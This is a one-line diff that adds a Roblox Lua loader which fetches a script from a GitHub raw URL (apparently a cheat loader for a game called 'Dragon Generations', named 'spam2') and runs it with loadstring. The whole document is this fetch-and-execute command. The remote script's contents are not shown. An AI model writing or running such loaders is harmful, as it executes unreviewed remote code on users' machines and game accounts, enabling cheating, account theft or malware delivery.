@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/dragon-generations-spam2-imkjjlwxo22yc6.lua"))()
